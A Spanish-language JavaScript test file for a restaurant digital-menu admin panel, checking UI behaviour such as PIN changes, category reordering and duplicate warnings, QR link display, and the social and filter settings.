		assert.match(elegir, /btn\.scrollIntoView\?\.\(\{ block: 'nearest', inline: 'nearest'/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('la dirección de la carta se lee entera en la pestaña QR', () => {
	// M2 en docs/revision-ux.md: un campo de 232 px en móvil la cortaba.
	const src = codigoDelPanel();

	test('es un enlace que parte línea, no un campo de una sola línea', () => {
		assert.match(src, /<a id="qrEnlace" class="qr-enlace" target="_blank" rel="noopener"><\/a>/);
		assert.doesNotMatch(src, /<input[^>]*id="qrEnlace"/);
		const regla = src.match(/\.qr-enlace\{[^}]*\}/)[0];
		assert.match(regla, /overflow-wrap:anywhere/);
		assert.match(regla, /min-width:0/);
	});

	test('rellenar los controles pone la dirección como texto y como destino', () => {
		const campos = {};
		const $ = id => (campos[id] ||= {});
		const ctx = cargar('qr.js', 'function qrAplicarAControles', 'function qrCopiarEnlace', {
			document: { getElementById: $, querySelectorAll: () => [] }, qrCfg: {},
			urlPublica: () => 'https://menu.vmenus.co/zz-pruebas-ux', state: { restaurante: {} },
		});
		ctx.qrEnlace = () => 'https://menu.vmenus.co/zz-pruebas-ux';
		ctx.qrAplicarAControles();
		assert.equal(campos.qrEnlace.textContent, 'https://menu.vmenus.co/zz-pruebas-ux');
		assert.equal(campos.qrEnlace.href, 'https://menu.vmenus.co/zz-pruebas-ux');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('el cliente cambia su propio PIN', () => {
	// CL3 en docs/revision-ux.md. La ruta está probada en pin.test.js; aquí, el panel.
	const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');

	function montar(respuesta) {
		const campos = {};
		const $ = id => (campos[id] ||= { value: '', textContent: '', disabled: false });
		const peticiones = [], avisos = [], cerrados = [];
		const ctx = cargar('index.html', '// ── CAMBIAR MI PIN (cliente)', 'function entrarARestaurante', {
			document: { getElementById: $ },
			apiFetch: async (m, ruta, cuerpo) => { peticiones.push({ m, ruta, cuerpo }); if (respuesta instanceof Error) throw respuesta; return respuesta; },
			showToast: (m, t) => avisos.push({ m, t }), closeModal: id => cerrados.push(id), openModal() {}, setTimeout() {},
		});
		return { ctx, $, peticiones, avisos, cerrados };
	}

	test('explica en palabras lo que está mal antes de enviar nada', () => {
		const { ctx } = montar({ ok: true });
		assert.match(ctx.errorDeMiPin('', '5678', '5678'), /actual/);
		assert.match(ctx.errorDeMiPin('1234', '12', '12'), /entre 4 y 10/);
		assert.match(ctx.errorDeMiPin('1234', '12345678901', '12345678901'), /entre 4 y 10/);
		assert.match(ctx.errorDeMiPin('1234', '5678', '5679'), /no coinciden/);
		assert.match(ctx.errorDeMiPin('1234', '1234', '1234'), /igual/);
		assert.equal(ctx.errorDeMiPin('1234', '5678', '5678'), null);
	});

	test('con datos buenos manda el actual y el nuevo, cierra y lo dice', async () => {
		const { ctx, $, peticiones, avisos, cerrados } = montar({ ok: true });
		$('miPinActual').value = '1234'; $('miPinNuevo').value = '5678'; $('miPinRepetir').value = '5678';
		await ctx.guardarMiPin();
		assert.equal(JSON.stringify(peticiones), JSON.stringify([{ m: 'PATCH', ruta: '/api/mi-pin', cuerpo: { actual: '1234', nuevo: '5678' } }]));
		assert.deepEqual(cerrados, ['miPinModal']);
		assert.match(avisos[0].m, /PIN cambiado/);
		assert.equal($('miPinGuardar').disabled, false);
	});

	test('si no coinciden no sale ninguna petición', async () => {
		const { ctx, $, peticiones } = montar({ ok: true });
		$('miPinActual').value = '1234'; $('miPinNuevo').value = '5678'; $('miPinRepetir').value = '8765';
		await ctx.guardarMiPin();
		assert.equal(peticiones.length, 0);
		assert.match($('miPinError').textContent, /no coinciden/);
	});

	test('el PIN actual equivocado se queda en el modal, con el motivo', async () => {
		const { ctx, $, avisos, cerrados } = montar(new Error('El PIN actual no es correcto'));
		$('miPinActual').value = '0000'; $('miPinNuevo').value = '5678'; $('miPinRepetir').value = '5678';
		await ctx.guardarMiPin();
		assert.equal(cerrados.length, 0);
		assert.equal(avisos.length, 0);
		assert.match($('miPinError').textContent, /no es correcto/);
	});

	test('una sesión caducada no se anuncia como PIN cambiado', async () => {
		const { ctx, $, avisos } = montar(null);
		$('miPinActual').value = '1234'; $('miPinNuevo').value = '5678'; $('miPinRepetir').value = '5678';
		await ctx.guardarMiPin();
		assert.equal(avisos.length, 0);
	});

	test('el botón es solo del cliente, y los campos se entienden con el gestor de contraseñas', () => {
		assert.match(src, /getElementById\('btnMiPin'\)\.style\.display = state\.rol==='cliente'/);
		assert.match(src, /id="miPinActual" maxlength="10" autocomplete="current-password"/);
		assert.match(src, /id="miPinNuevo" maxlength="10" autocomplete="new-password"/);
	});

	test('ningún campo deja escribir un PIN que el login no admite', () => {
		// El login corta en 10: un PIN de 11 se guardaría y no serviría para entrar.
		assert.match(src, /id="pinInput"\s+maxlength="10"/);
		assert.match(src, /id="newPinValue"[^>]*maxlength="10"/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('el modal de categoría avisa de una casi repetida', () => {
	// P3 en docs/revision-ux.md: «HAMBURGUESA» y «Hamburguesas» en la misma carta.
	const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
	const CATS = [
		{ id: 'a', nombre: 'HAMBURGUESA' }, { id: 'b', nombre: 'Postres' }, { id: 'c', nombre: 'Café' },
	];

	function montar({ id = '', nombre = '', productos = [] } = {}) {
		const campos = { editCatId: { value: id }, editCatNombre: { value: nombre }, catParecida: { hidden: true, textContent: '' } };
		const ctx = cargar('index.html', [
			['importar.js', 'function impNormalizar', 'const IMP_SIN_CATEGORIA'],
			['importar.js', 'function impRaiz', 'function impTotales'],
			['// ── CATEGORÍA CASI REPETIDA (P3)', 'async function saveCat'],
		], { document: { getElementById: i => campos[i] }, state: { categorias: CATS, productos } });
		return { ctx, campos };
	}

	test('reconoce plural, mayúsculas y tildes, y no se compara consigo misma', () => {
		const { ctx } = montar();
		assert.equal(ctx.categoriaParecida('Hamburguesas', null, CATS).nombre, 'HAMBURGUESA');
		assert.equal(ctx.categoriaParecida('POSTRE', null, CATS).nombre, 'Postres');
		assert.equal(ctx.categoriaParecida('cafe', null, CATS).nombre, 'Café');
		assert.equal(ctx.categoriaParecida('HAMBURGUESA', 'a', CATS), null, 'editar la propia no avisa');
	});

	test('no avisa de lo que es distinto a propósito', () => {
		const { ctx } = montar();
		assert.equal(ctx.categoriaParecida('Postre del día', null, CATS), null);
		assert.equal(ctx.categoriaParecida('Perros', null, CATS), null);
		assert.equal(ctx.categoriaParecida('   ', null, CATS), null);
	});

	test('al crear, dice cuál es y cuántos platos tiene', () => {
		const { ctx, campos } = montar({ nombre: 'Hamburguesas', productos: [{ categoria_id: 'a' }, { categoria_id: 'a' }, { categoria_id: 'b' }] });
		ctx.avisarCategoriaParecida();
		assert.equal(campos.catParecida.hidden, false);
		assert.match(campos.catParecida.textContent, /«HAMBURGUESA» \(2 platos\)/);
		assert.match(campos.catParecida.textContent, /añade los platos ahí/);
	});

	test('al editar una ya duplicada, lo dice también', () => {
		const { ctx, campos } = montar({ id: 'zz', nombre: 'Hamburguesas', productos: [{ categoria_id: 'a' }] });
		ctx.avisarCategoriaParecida();
		assert.match(campos.catParecida.textContent, /\(1 plato\)/);
		assert.match(campos.catParecida.textContent, /pasa los platos a una/);
	});

	test('al corregir el nombre, el aviso desaparece', () => {
		const { ctx, campos } = montar({ nombre: 'Hamburguesas' });
		ctx.avisarCategoriaParecida();
		campos.editCatNombre.value = 'Perros';
		ctx.avisarCategoriaParecida();
		assert.equal(campos.catParecida.hidden, true);
	});

	test('se revisa al escribir y al abrir el modal, en los dos modos, y no bloquea el guardado', () => {
		assert.match(src, /id="editCatNombre"[^>]*oninput="avisarCategoriaParecida\(\)"/);
		const abrirNueva = src.match(/function openNewCatModal\(\) \{[\s\S]*?\n\}/)[0];
		assert.match(abrirNueva, /avisarCategoriaParecida\(\);\s*openModal\('catModal'\)/);
		const abrirEditar = src.match(/function openEditCatModal\([^)]*\) \{[\s\S]*?\n\}/)[0];
		assert.match(abrirEditar, /avisarCategoriaParecida\(\);\s*openModal\('catModal'\)/);
		const guardar = src.match(/async function saveCat\(\) \{[\s\S]*?\n\}/)[0];
		assert.doesNotMatch(guardar, /categoriaParecida/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('las categorías se reordenan arrastrando', () => {
	// C1 en docs/revision-ux.md: 20 clics para subir la última de 21, y la fila
	// se escapaba del puntero en cada uno.
	const src = codigoDelPanel();
	const TRAMO = [['async function enTandas', 'function ordenProductosModo'], ['async function moveCat', '// ── ELIMINAR']];
	const cats = () => ['a', 'b', 'c', 'd'].map((id, i) => ({ id, nombre: id.toUpperCase(), orden: i }));

	function montar(extra = {}) {
		const patches = [], avisos = [];
		const ctx = cargar('index.html', TRAMO, {
			state: { categorias: cats(), restaurante: { id: 'r1' } },
			apiFetch: async (m, ruta, cuerpo) => { patches.push({ ruta, ...cuerpo }); return {}; },
			renderCatList() {}, renderCatFilter() {}, showToast: (m) => avisos.push(m), avisarGuardadoConCarta: (m) => avisos.push(m),
			document: { querySelector: () => null }, ...extra,
		});
		return { ctx, patches, avisos };
	}

	test('llevar una fila a otra posición corre las demás', () => {
		const { ctx } = montar();
		assert.deepEqual([...ctx.moverEnLista(['a', 'b', 'c', 'd'], 3, 0)], ['d', 'a', 'b', 'c']);
		assert.deepEqual([...ctx.moverEnLista(['a', 'b', 'c', 'd'], 0, 2)], ['b', 'c', 'a', 'd']);
	});

	test('la posición sale de la altura del puntero frente a la mitad de cada fila', () => {
		const { ctx } = montar();
		const mitades = [100, 160, 220];
		assert.equal(ctx.posicionDeArrastre(mitades, 50), 0, 'por encima de todo, arriba');
		assert.equal(ctx.posicionDeArrastre(mitades, 130), 1);
		assert.equal(ctx.posicionDeArrastre(mitades, 999), 3, 'por debajo de todo, al final');
	});

	test('soltar la última arriba es un guardado con un solo aviso, no veinte', async () => {
		const { ctx, patches, avisos } = montar();
		assert.equal(await ctx.guardarOrdenCategorias(['d', 'a', 'b', 'c']), true);
		assert.deepEqual([...ctx.state.categorias.map(c => c.id)], ['d', 'a', 'b', 'c']);
		assert.deepEqual([...ctx.state.categorias.map(c => c.orden)], [0, 1, 2, 3]);
		assert.equal(patches.length, 4);
		assert.equal(avisos.length, 1);
	});

	test('soltar donde estaba no guarda nada', async () => {
		const { ctx, patches, avisos } = montar();
		assert.equal(await ctx.guardarOrdenCategorias(['a', 'b', 'c', 'd']), true);
		assert.equal(patches.length, 0);
		assert.equal(avisos.length, 0);
	});

	test('tras una flecha, el foco vuelve a la misma flecha de la fila movida', async () => {
		const enfocados = [];
		const boton = dir => ({ style: {}, focus: () => enfocados.push(dir), scrollIntoView() {} });
		const fila = { querySelector: sel => boton(sel.match(/data-dir="(-?\d)"/)[1]) };
		const { ctx } = montar({ document: { querySelector: sel => (sel.includes('data-id="c"') ? fila : null) } });
		await ctx.moveCat('c', -1);
		assert.deepEqual(enfocados, ['-1']);
	});

	test('si la captura del puntero falla, el arrastre no se queda abierto', () => {
		const clases = () => ({ add() {}, remove() {} });
		const escuchas = [];
		const fila = { classList: clases() };
		const lista = { classList: clases(), querySelectorAll: () => [], insertBefore() {} };
		const ctx = cargar('index.html', [['let arrastreCat=null;', '// ── ELIMINAR']], {
			document: { getElementById: () => lista, addEventListener: (t) => escuchas.push(t), removeEventListener() {} },
			requestAnimationFrame: () => 1, cancelAnimationFrame() {}, window: { innerHeight: 800, scrollBy() {} },
		});
		const ev = { button: 0, pointerId: 7, clientY: 10, preventDefault() {},
			currentTarget: { setPointerCapture() { throw new Error('NotFoundError'); } } };
		assert.doesNotThrow(() => ctx.empezarArrastreCat(ev, fila));
		assert.ok(escuchas.includes('pointerup'), 'sin la escucha de soltar, no se cierra nunca');
	});

	test('el asa solo bloquea el desplazamiento táctil en sí misma, y Escape cancela', () => {
		assert.match(src, /\.cat-asa\{[^}]*touch-action:none/);
		assert.doesNotMatch(src, /\.cat-row\{[^}]*touch-action:none/);
		assert.match(src, /asa\.addEventListener\('pointerdown',ev=>empezarArrastreCat\(ev,row\)\)/);
		const tecla = src.match(/function teclaArrastreCat\(ev\) \{[\s\S]*?\n\}/)[0];
		assert.match(tecla, /Escape[\s\S]*cancelarArrastreCat/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('el modal de categoría marca las que se piden sin abrir la ficha', () => {
	// B3, segunda mitad, en docs/revision-ux.md.
	const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');

	test('la casilla existe, se explica y tiene su etiqueta', () => {
		assert.match(src, /<input type="checkbox" id="editCatSinAbrir" aria-describedby="editCatSinAbrirAyuda">/);
		assert.match(src, /<label for="editCatSinAbrir"[^>]*>Se pide sin abrir la ficha<\/label>/);
		assert.match(src, /id="editCatSinAbrirAyuda"[^>]*>[\s\S]*?En la carta no cambia nada/);
	});

	test('al abrir se rellena en los dos modos', () => {
		const nueva = src.match(/function openNewCatModal\(\) \{[\s\S]*?\n\}/)[0];
		assert.match(nueva, /getElementById\('editCatSinAbrir'\)\.checked=false/);
		const editar = src.match(/function openEditCatModal\([^)]*\) \{[\s\S]*?\n\}/)[0];
		assert.match(editar, /getElementById\('editCatSinAbrir'\)\.checked=!!cat\.atributos\?\.se_pide_sin_abrir/);
	});

	test('guardar la pone al marcarla y la borra al desmarcarla', () => {
		const guardar = src.match(/async function saveCat\(\) \{[\s\S]*?\n\}/)[0];
		assert.match(guardar, /if\(document\.getElementById\('editCatSinAbrir'\)\.checked\) atributos\.se_pide_sin_abrir = true;\s*else delete atributos\.se_pide_sin_abrir;/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('la categoría lleva una nota opcional para la carta', () => {
	// P4 en docs/revision-ux.md: avisos hechos con platos de $ 0.
	const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');

	test('el campo existe, con etiqueta y el mismo tope que el servidor', () => {
		assert.match(src, /<label for="editCatNota" class="form-label">Nota/);
		assert.match(src, /<textarea class="form-textarea" id="editCatNota" maxlength="200"/);
		const servidor = fs.readFileSync(path.join(__dirname, '..', 'server.js'), 'utf8');
		assert.match(servidor, /const NOTA_CATEGORIA_MAX = 200;/);
	});

	test('se rellena al abrir en los dos modos', () => {
		const nueva = src.match(/function openNewCatModal\(\) \{[\s\S]*?\n\}/)[0];
		assert.match(nueva, /getElementById\('editCatNota'\)\.value=''/);
		const editar = src.match(/function openEditCatModal\([^)]*\) \{[\s\S]*?\n\}/)[0];
		assert.match(editar, /getElementById\('editCatNota'\)\.value=cat\.atributos\?\.nota \|\| ''/);
	});

	test('guardar la pone recortada, y vacía la borra', () => {
		const guardar = src.match(/async function saveCat\(\) \{[\s\S]*?\n\}/)[0];
		assert.match(guardar, /const nota=document\.getElementById\('editCatNota'\)\.value\.trim\(\);\s*if\(nota\) atributos\.nota = nota; else delete atributos\.nota;/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('Apariencia enseña lo que el modelo usa', () => {
	// A4 en docs/revision-ux.md.
	const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
	const conModelo = nav => {
		const mapa = { apNavModelo: { value: nav }, apEstiloFila: { style: {} }, apPortadaCard: { style: {} }, apHeroFila: { style: {} } };
		const ctx = cargar('index.html', [['function navElegido', 'function aplicarPlanAlPanel']], {
			state: { restaurante: { atributos: { nav } } },
			document: { getElementById: id => mapa[id] },
		});
		ctx.ajustarEstiloAlModelo();
		return mapa;
	};

	test('la portada solo con explorar', () => {
		assert.equal(conModelo('explorar').apPortadaCard.style.display, '');
		for (const nav of ['topnav', 'sidebar', 'carrito', 'video', 'vertical'])
			assert.equal(conModelo(nav).apPortadaCard.style.display, 'none', nav);
	});

	test('el mensaje de bienvenida solo con sidebar', () => {
		// Y con Carrito hasta que se retiró el 17/09/2026.
		assert.equal(conModelo('sidebar').apHeroFila.style.display, 'flex');
		for (const nav of ['topnav', 'explorar', 'video', 'vertical'])
			assert.equal(conModelo(nav).apHeroFila.style.display, 'none', nav);
	});

	test('se ajusta al cambiar el modelo y al cargar', () => {
		assert.match(src, /id="apNavModelo" onchange="ajustarEstiloAlModelo\(\)"/);
		assert.match(src, /getElementById\('apNavModelo'\)\.value = at\.nav \|\| 'topnav';[^\n]*\n[^\n]*\n\s*ajustarEstiloAlModelo\(\);/);
	});

	test('los filtros no se esconden ni dicen que son de explorar: los pintan todos los modelos', () => {
		// Desde el 15/09/2026, en la pestaña Ajustes y no en Apariencia.
		assert.match(src, /<div class="section-card" id="ajFiltrosCard">[\s\S]{0,600}?<div class="section-title">Filtros y etiquetas<\/div>/);
		assert.doesNotMatch(src, /apFiltros/);
		assert.doesNotMatch(src, /\(solo modelo explorar\)<\/span><\/div>/);
		const ajustar = src.match(/function ajustarEstiloAlModelo\(\) \{[\s\S]*?\n\}/)[0];
		assert.doesNotMatch(ajustar, /apFiltrosCard/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('el formulario de crear restaurante va plegado', () => {
	// S4 en docs/revision-ux.md: seis gestos en móvil hasta el primer restaurante.
	const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');

	test('es un <details> cerrado, con el título como lo que se pulsa', () => {
		assert.match(src, /<details class="new-resto-card" id="nuevoRestoPanel">\s*<summary class="section-title new-resto-summary">\+ Nuevo restaurante<\/summary>/);
		assert.doesNotMatch(src, /<details class="new-resto-card" id="nuevoRestoPanel" open/);
		const i = src.indexOf('id="nuevoRestoPanel"');
		const f = src.indexOf('</details>', i);
		assert.ok(src.slice(i, f).includes('id="newRestoNombre"'), 'los campos van dentro');
		assert.ok(src.slice(i, f).includes('onclick="crearRestaurante()"'));
	});

	test('al crear se pliega, antes de llevar al restaurante nuevo', () => {
		const crear = src.match(/async function crearRestaurante\(\) \{[\s\S]*?\n\}/)[0];
		assert.match(crear, /getElementById\('nuevoRestoPanel'\)\.open=false;\s*llevarARestauranteNuevo/);
	});

	test('el PIN de un restaurante nuevo no pasa de lo que admite el login', () => {
		assert.match(src, /id="newRestoPin"[^>]*maxlength="10"/);
		const crear = src.match(/async function crearRestaurante\(\) \{[\s\S]*?\n\}/)[0];
		assert.match(crear, /pin\.length>10/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('las redes sociales las edita el restaurante, en Ajustes', () => {
	// 15/09/2026: primer paso de abrir partes de Apariencia al restaurante
	// (CLAUDE.md). Las redes salen de Apariencia y viven solo en Ajustes: dos
	// pantallas guardando las mismas claves se pisarían entre ellas.
	const src = codigoDelPanel();

	test('Apariencia ya no las lee ni las guarda', () => {
		assert.doesNotMatch(src, /apSocial/, 'no queda ningún campo de redes en Apariencia');
		const recolectar = src.match(/function recolectarApariencia\(\) \{[\s\S]*?\n\}/)[0];
		assert.doesNotMatch(recolectar, /social_/, 'guardar Apariencia pisaría lo que cambió el restaurante');
	});

	test('la pestaña se ve para el restaurante, y abrirla la pinta', () => {
		const boton = src.match(/<button[^>]*id="tabBtnAjustes"[^>]*>/)[0];
		assert.doesNotMatch(boton, /display:\s*none/, 'no puede nacer escondida: es del restaurante');
		const cambiar = src.match(/function switchTab\(tab, btn\) \{[\s\S]*?\n\}/)[0];
		assert.match(cambiar, /'tabAjustes'/);
		assert.match(cambiar, /if \(tab === 'ajustes'\) renderAjustes\(\);/);
		assert.doesNotMatch(cambiar.split('\n')[1], /ajustes/, 'no se corta para el restaurante como Apariencia');
	});

	function montar(atributos = {}, apiFetch) {
		const campos = {};
		const $ = id => (campos[id] ||= { value: '', checked: false, textContent: '', style: {} });
		const avisos = [];
		const ctx = cargar('ajustes.js', '// ── PINTAR, RECOGER Y GUARDAR', '// ── FILTROS Y ETIQUETAS', {
			document: { getElementById: $ },
			renderFiltrosCatalogo: () => {},
			pintarNotaCarrito: () => {}, puedeElegirCarrito: () => false,
			ajustarPestanasAlModelo: () => {}, cartaTieneCarrito: () => false, fijarFotoDePestana: () => {},
			// Los pedidos viven en esta misma pantalla desde el 16/09/2026, pero
			// esta prueba es de redes: sin carrito, no se recogen.
			renderPedidos: () => {}, renderMetodosPago: () => {}, recolectarMetodosPago: () => ({}),
			renderToppings: () => {}, hayQueEnsenarToppings: () => false,
			// Marcar los campos que faltan vive en index.html; aquí no hay pantalla.
			pintarErroresEnCampos() {}, CAMPOS_METODOS_PAGO: [], erroresDeMetodosPago: () => [],
			carritoEnPantalla: () => false,
			planActual: () => ({}), recibePedidos: () => false,
			state: { restaurante: { id: 'r1', atributos } },
			showToast: (m, t) => avisos.push([t, m]), avisarGuardadoConCarta: (m) => avisos.push(['success', m]),
			apiFetch, Object,
		});
		return { ctx, campos: $, avisos };
	}

	test('pinta lo guardado y recoge limpio', () => {
		const { ctx, campos } = montar({ social_bar: true, social_instagram: 'https://instagram.com/x', social_whatsapp: '573001234567' });
		ctx.renderAjustes();
		assert.equal(campos('ajSocialBar').checked, true);
		assert.equal(campos('ajSocialInstagram').value, 'https://instagram.com/x');
		assert.equal(campos('ajSocialFacebook').value, '');

		campos('ajSocialTiktok').value = '  https://tiktok.com/@x  ';
		campos('ajSocialWhatsapp').value = '+57 300 123 4567';
		const r = ctx.recolectarAjustes();
		assert.equal(r.social_tiktok, 'https://tiktok.com/@x');
		assert.equal(r.social_whatsapp, '573001234567');
		assert.deepEqual(Object.keys(r).sort(), ['buscador', 'filtros_activos', 'filtros_disponibles', 'social_bar', 'social_facebook', 'social_instagram', 'social_tiktok', 'social_whatsapp']);
	});

	test('guardar manda solo lo de Ajustes y deja el estado al día', async () => {
		const peticiones = [];
		const { ctx, campos, avisos } = montar({ nav: 'topnav' }, async (metodo, ruta, cuerpo) => {
			peticiones.push({ metodo, ruta, cuerpo });
			return { id: 'r1', atributos: { nav: 'topnav', ...cuerpo.atributos } };
		});
		ctx.renderAjustes();
		campos('ajSocialBar').checked = true;
		campos('ajSocialInstagram').value = 'https://instagram.com/bonzas';
		await ctx.saveAjustes();

		assert.equal(peticiones.length, 1);
		assert.equal(peticiones[0].metodo, 'PATCH');
		assert.equal(peticiones[0].ruta, '/api/restaurantes/r1');
		assert.deepEqual(Object.keys(peticiones[0].cuerpo), ['atributos'], 'nada fuera de atributos');
		assert.ok(Object.keys(peticiones[0].cuerpo.atributos).every(k => k.startsWith('social_') || k.startsWith('filtros_') || k === 'buscador'),
			'solo las claves de Ajustes');
		assert.equal(ctx.state.restaurante.atributos.social_instagram, 'https://instagram.com/bonzas');
		assert.equal(campos('ajustesStatus').textContent, '✓ Guardado');
		assert.deepEqual(avisos, [['success', 'Ajustes guardados']]);
	});

	test('si el servidor lo rechaza, se dice el motivo junto al botón', async () => {
		const { ctx, campos, avisos } = montar({}, async () => {
			throw new Error('El enlace de Facebook tiene que ser una dirección completa, empezando por https://');
		});
		ctx.renderAjustes();
		await ctx.saveAjustes();
		assert.match(campos('ajustesStatus').textContent, /Facebook/);
		assert.equal(avisos[0][0], 'error');
	});

	test('los filtros se pintan desde lo guardado, sobre una copia', () => {
		const guardados = [{ id: 'picante', label: 'Picante', emoji: '🌶' }];
		const { ctx } = montar({ filtros_disponibles: guardados });
		ctx.renderAjustes();
		assert.equal(JSON.stringify(ctx.state.filtrosDisponibles), JSON.stringify(guardados));
		ctx.state.filtrosDisponibles.push({ id: 'frio', label: 'Frío', emoji: '❄️' });
		assert.equal(guardados.length, 1, 'tocar un chip no cambia lo guardado hasta pulsar Guardar');
	});

	test('añadir, marcar y quitar filtros cambia lo que se va a guardar', () => {
		const campos = {};
		const $ = id => (campos[id] ||= { value: '', style: {}, innerHTML: '', appendChild() {} });
		const chips = [];
		const nodo = () => { const n = { style: {}, innerHTML: '', textContent: '', hijos: [], appendChild(h) { this.hijos.push(h); if (h.onclick) chips.push(h); return h; } }; return n; };
		const avisos = [];
		const ctx = cargar('ajustes.js', '// ── FILTROS Y ETIQUETAS', null, {
			document: { getElementById: $, createElement: nodo },
			state: { filtrosDisponibles: [] },
			CATALOGO_FILTROS: [{ grupo: 'Picante', items: [{ id: 'picante', label: 'Picante', emoji: '🌶' }] }],
			esc: x => String(x), showToast: (m, t) => avisos.push([t, m]),
		});
		ctx.renderFiltrosCatalogo();
		chips.find(c => c.innerHTML.includes('Picante')).onclick();
		assert.deepEqual(ctx.state.filtrosDisponibles.map(f => f.id), ['picante']);

		$('ajFiltroCustomLabel').value = 'Sin cebolla';
		$('ajFiltroCustomEmoji').value = '🧅';
		ctx.agregarFiltroCustom();
		assert.deepEqual(ctx.state.filtrosDisponibles.map(f => f.id), ['picante', 'custom_sin_cebolla']);

		$('ajFiltroCustomLabel').value = 'Sin Cebolla';
		ctx.agregarFiltroCustom();
		assert.equal(ctx.state.filtrosDisponibles.length, 2, 'el mismo nombre con otras mayúsculas no se duplica');
		assert.deepEqual(avisos.at(-1), ['error', 'Ese filtro ya existe']);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('el orden de Ajustes y el nombre del carrito', () => {
	// 16/09/2026, decidido con el usuario: lo que cambia la carta va primero y
	// las redes al final, y «Pedidos desde la carta» pasa a «Carrito de compras»
	// porque es lo que la gente reconoce sin que nadie se lo explique.
	const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');

	test('Inicio va primero y Ajustes queda tras Productos y Categorías', () => {
		// Inicio responde primero «cómo está mi carta»; después se conservan las
		// tres pestañas de trabajo que ya estaban juntas en móvil.
		//
		// Se miran las que ve el RESTAURANTE, no todos los botones del carril:
		// desde el 17/09/2026 «Superadmin» va la segunda, y nace escondida
		// (display:none), así que para el cliente este orden no cambia.
		const carril = src.match(/<div class="tabs">[\s\S]*?<\/div>/)[0];
		const botones = [...carril.matchAll(/<button[^>]*onclick="switchTab\('([a-z]+)'[^>]*>/g)]
			.filter(m => !/display:\s*none/.test(m[0]))
			.map(m => m[1]);
		assert.equal(JSON.stringify(botones.slice(0, 4)), '["inicio","productos","categorias","ajustes"]');
	});

	test('Superadmin es la segunda del carril y nace escondida', () => {
		const carril = src.match(/<div class="tabs">[\s\S]*?<\/div>/)[0];
		const botones = [...carril.matchAll(/<button[^>]*onclick="switchTab\('([a-z]+)'[^>]*>([^<]*)</g)];
		assert.equal(botones[1][1], 'apariencia', 'va detrás de Inicio');
		assert.equal(botones[1][2], 'Superadmin', 'el nombre dice quién la ve');
		assert.match(botones[1][0], /display:\s*none/, 'el restaurante no la ve');
	});

	test('dentro de Ajustes: carrito, filtros y las redes al final', () => {
		const tab = src.slice(src.indexOf('<div id="tabAjustes"'), src.indexOf('<div id="tabQr"'));
		const orden = [...tab.matchAll(/<div class="(?:section-title|aj-subtitulo)">([^<]+)</g)].map(m => m[1].trim());
		assert.equal(JSON.stringify(orden.slice(0, 3)),
			'["Carrito de compras","WhatsApp para recibir pedidos","Métodos de pago"]',
			'el carrito y lo suyo, primero');
		assert.equal(JSON.stringify(orden.slice(-2)), '["Filtros y etiquetas","Redes sociales"]',
			'los filtros después, y las redes al final');
		assert.ok(tab.indexOf('saveAjustes()') > tab.indexOf('Redes sociales'), 'el botón de guardar, después de todas');
	});

	test('el interruptor del carrito se llama igual para un lector de pantalla', () => {
		const tarjeta = src.slice(src.indexOf('id="ajCarritoCard"'), src.indexOf('id="ajCarritoNota"'));
		assert.match(tarjeta, /aria-label="Carrito de compras"/);
		assert.doesNotMatch(tarjeta, /Pedidos desde la carta/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('el interruptor de filtros y la nota que explica lo que se ve', () => {
	// 16/09/2026. «Si no marcas ninguno, no salen» lo entiende quien hizo el
	// panel; el restaurante ve una lista de chips y no sabe si aquello está
	// encendido. Y el caso que de verdad se confunde con un fallo es tener
	// filtros elegidos sin ningún plato marcado: la carta no enseña ninguno.
	const src = codigoDelPanel();
	const desde = src.indexOf('id="ajFiltrosCard"');
	const tarjeta = src.slice(desde, desde + 2200);

	test('la tarjeta trae interruptor, cuerpo plegable y nota', () => {
		assert.match(tarjeta, /id="ajFiltros"[^>]*onchange="pintarFiltros\(\)"/);
		assert.match(tarjeta, /id="ajFiltrosNota"/);
		// El catálogo y el campo de personalizados van DENTRO del cuerpo: son
		// lo que se esconde al apagar.
		const cuerpo = tarjeta.indexOf('id="ajFiltrosCuerpo"');
		assert.ok(cuerpo > -1 && cuerpo < tarjeta.indexOf('id="ajFiltrosCatalogo"'));
		assert.ok(cuerpo < tarjeta.indexOf('id="ajFiltroCustomLabel"'));
	});

	function montarFiltros({ filtros = [], productos = [], encendido = true } = {}) {
		const campos = {};
		const $ = id => (campos[id] ||= { value: '', checked: false, textContent: '', style: {}, innerHTML: '', appendChild() {} });
		$('ajFiltros').checked = encendido;
		const nodo = () => ({ style: {}, innerHTML: '', textContent: '', hijos: [], appendChild(h) { this.hijos.push(h); return h; } });
		const ctx = cargar('ajustes.js', '// ── FILTROS Y ETIQUETAS', '// ── PEDIDOS DESDE LA CARTA', {
			document: { getElementById: $, createElement: nodo },
			state: { filtrosDisponibles: filtros, productos },
			CATALOGO_FILTROS: [], esc: x => String(x), showToast: () => {},
		});
		return { ctx, $ };
	}

	const PICANTE = { id: 'picante', label: 'Picante', emoji: '🌶' };
	const SIN_LACTEOS = { id: 'sin_lacteos', label: 'Sin lácteos', emoji: '🥛' };
	const plato = (...filtros) => ({ id: 'p' + filtros.join(''), atributos: { filtros } });

	test('apagado esconde la sección y lo dice sin asustar', () => {
		const { ctx, $ } = montarFiltros({ filtros: [PICANTE], encendido: false });
		ctx.pintarFiltros();
		assert.equal($('ajFiltrosCuerpo').style.display, 'none');
		assert.match($('ajFiltrosNota').textContent, /no enseña filtros/);
		assert.match($('ajFiltrosNota').textContent, /se guarda aunque lo apagues/,
			'apagar no borra, y hay que decirlo: si no, nadie se atreve a apagarlo');
		assert.equal($('ajFiltrosNota').style.color, 'var(--text-muted)', 'no es un problema, es una decisión suya');
	});

